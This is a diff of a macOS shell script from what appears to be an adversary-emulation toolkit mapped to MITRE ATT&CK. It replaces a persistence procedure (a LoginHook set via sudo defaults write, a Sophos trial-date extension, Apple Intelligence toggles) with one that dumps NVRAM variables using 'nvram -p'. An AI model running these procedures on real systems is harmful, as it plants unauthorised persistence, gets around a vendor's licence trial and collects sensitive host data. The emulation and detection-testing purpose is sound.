@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: modify_preferences
+# Procedure Name: nvram
 # Tactic: Persistence
-# Technique: T1547
-# GUID: 3b366584-63de-4b56-87fa-46eb2dd0f1e5
-# Intent: Establish persistence by modifying system login preferences and extending application trial periods using defaults write commands
-# Author: @darmado | https://x.com/darmad0
-# created: 2025-01-27
+# Technique: T1547.006
+# GUID: 31e9f95d-17c5-44a7-93c4-009f5c6c2955
+# Intent: Access and manage the host's non-volatile random-access memory (NVRAM). Sourced from LOOBins; confirm MITRE mapping for each enabled option.
+# Author: Brendan Chamberlain (@infosecB)
+# created: 2023-05-23
 # Updated: 2026-05-03
-# Version: 1.0.9
+# Version: 1.0.4
 # License: Apache 2.0
 
 # Core function Info:
@@ -20,7 +20,7 @@
 NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Persistence" #replace with you coresponding tactic
-TTP_ID="T1547" #replace with you coresponding ttp_id
+TTP_ID="T1547.006" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,22 +92,15 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-INPUT_LOGIN_HOOK=""
-LOGIN_HOOK=false
-EXTEND_SOPHOS=false
-AI_MANIPULATION=false
-CHECK_PERSISTENCE=false
+GET_NVRAM_VARIABLES=false
 
-CMD_DEFAULTS="defaults"
-CMD_SUDO="sudo"
-DEFAULT_HOOK_PATH="/tmp/gain_persistence.sh"
-SOPHOS_TRIAL_DATE="2026-05-30 08:46:00 +0000"
+CMD_NVRAM="/usr/sbin/nvram"
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/Desktop/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="modify_preferences"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="nvram"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -649,25 +642,8 @@ core_parse_args() {
                 SACRIFICIAL_CHILD=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --login-hook)
-            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
-                MISSING_VALUES="$MISSING_VALUES $1"
-            elif [ -n "$2" ]; then
-                INPUT_LOGIN_HOOK="$2"
-                LOGIN_HOOK=true
-                    shift
-            else
-                MISSING_VALUES="$MISSING_VALUES $1"
-                fi
-                ;;
-        --extend-sophos)
-            EXTEND_SOPHOS=true
-            ;;
-        --ai-manipulation)
-            AI_MANIPULATION=true
-            ;;
-        --check-persistence)
-            CHECK_PERSISTENCE=true
+        --get-nvram-variables)
+            GET_NVRAM_VARIABLES=true
             ;;
             *)
                 # Collect unknown arguments for error reporting
@@ -707,10 +683,7 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --login-hook VALUE               Set login hook for persistence
-  --extend-sophos                  Extend Sophos trial cache date
-  --ai-manipulation                Manipulate Apple Intelligence settings
-  --check-persistence              Check current persistence mechanisms
+  --get-nvram-variables            The -p option prints all the nvram variables that contain some potentially sensitive information lik
 
 EXECUTION:
   --sacrificial-pid             Run main logic in a child shell; parent reads child stdout from a FIFO under
@@ -2095,9 +2068,6 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
-# Process input arguments
-process_input_arguments
-
 # Helper function to execute procedure functions
 execute_function() {
     local func_name="$1"
@@ -2105,36 +2075,15 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --login-hook
-if [ "$LOGIN_HOOK" = true ]; then
-    core_debug_print "Executing functions for --login-hook"
-    result=$(execute_function set_login_hook)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --extend-sophos
-if [ "$EXTEND_SOPHOS" = true ]; then
-    core_debug_print "Executing functions for --extend-sophos"
-    result=$(execute_function extend_sophos_trial)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --ai-manipulation
-if [ "$AI_MANIPULATION" = true ]; then
-    core_debug_print "Executing functions for --ai-manipulation"
-    result=$(execute_function manipulate_ai_settings)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --check-persistence
-if [ "$CHECK_PERSISTENCE" = true ]; then
-    core_debug_print "Executing functions for --check-persistence"
-    result=$(execute_function check_persistence_status)
+# Execute functions for --get-nvram-variables
+if [ "$GET_NVRAM_VARIABLES" = true ]; then
+    core_debug_print "Executing functions for --get-nvram-variables"
+    result=$(execute_function execute_get_nvram_variables)
     raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
-procedure="modify_preferences"
+procedure="nvram"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2297,112 +2246,20 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-# Input processing and type conversion
-process_input_arguments() {
-    # Process and validate input arguments based on their types
-    
-    # Process --login-hook argument
-    if [ -n "${INPUT_LOGIN_HOOK}" ]; then
-        # Process string input
-        LOGIN_HOOK_ARG="${INPUT_LOGIN_HOOK}"
-    fi
-}
 
 
-# Function: set_login_hook
+# Function: execute_get_nvram_variables
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-set_login_hook() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Use provided path or default
-    local hook_path="${INPUT_LOGIN_HOOK:-$DEFAULT_HOOK_PATH}"
-    
-    # Set login hook
+execute_get_nvram_variables() {
     local result
-    result=$($CMD_SUDO $CMD_DEFAULTS write /Library/Preferences/com.apple.loginwindow LoginHook "$hook_path" 2>&1)
-    $CMD_PRINTF "LOGIN_HOOK|sudo defaults write /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$result"
-    
+    result=$(nvram -p 2>&1)
+    $CMD_PRINTF "RESULT|%s\n" "$result"
     return 0
 }
-
-
-# Function: extend_sophos_trial
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-extend_sophos_trial() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Read current Sophos trial date
-    local current_date
-    current_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
-    $CMD_PRINTF "SOPHOS_CURRENT|defaults read com.sophos.ipm cacheDate|%s\n" "$current_date"
-    
-    # Extend Sophos trial cache date
-    local result
-    result=$($CMD_DEFAULTS write com.sophos.ipm cacheDate "$SOPHOS_TRIAL_DATE" 2>&1)
-    $CMD_PRINTF "SOPHOS_EXTEND|defaults write com.sophos.ipm cacheDate|%s\n" "$result"
-    
-    return 0
-}
-
-
-# Function: manipulate_ai_settings
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-manipulate_ai_settings() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Disable Apple Intelligence
-    local disable_result
-    disable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false 2>&1)
-    $CMD_PRINTF "AI_DISABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool false|%s\n" "$disable_result"
-    
-    # Enable Apple Intelligence
-    local enable_result
-    enable_result=$($CMD_DEFAULTS write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true 2>&1)
-    $CMD_PRINTF "AI_ENABLE|defaults write com.apple.CloudSubscriptionFeatures.optIn 545129924 -bool true|%s\n" "$enable_result"
-    
-    return 0
-}
-
-
-# Function: check_persistence_status
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-check_persistence_status() {
-    $CMD_PRINTF "PERSISTENCE_TYPE|COMMAND|RESULT\n"
-    
-    # Check login hook
-    local login_hook
-    login_hook=$($CMD_SUDO $CMD_DEFAULTS read /Library/Preferences/com.apple.loginwindow LoginHook 2>/dev/null)
-    $CMD_PRINTF "LOGIN_HOOK_CHECK|sudo defaults read /Library/Preferences/com.apple.loginwindow LoginHook|%s\n" "$login_hook"
-    
-    # Check Sophos trial date
-    local sophos_date
-    sophos_date=$($CMD_DEFAULTS read com.sophos.ipm cacheDate 2>/dev/null)
-    $CMD_PRINTF "SOPHOS_DATE_CHECK|defaults read com.sophos.ipm cacheDate|%s\n" "$sophos_date"
-    
-    # Check AI settings
-    local ai_setting
-    ai_setting=$($CMD_DEFAULTS read com.apple.CloudSubscriptionFeatures.optIn 545129924 2>/dev/null)
-    $CMD_PRINTF "AI_SETTING_CHECK|defaults read com.apple.CloudSubscriptionFeatures.optIn 545129924|%s\n" "$ai_setting"
-    
-    return 0
-}
-
 
 
 JOB_ID=$(core_generate_job_id)
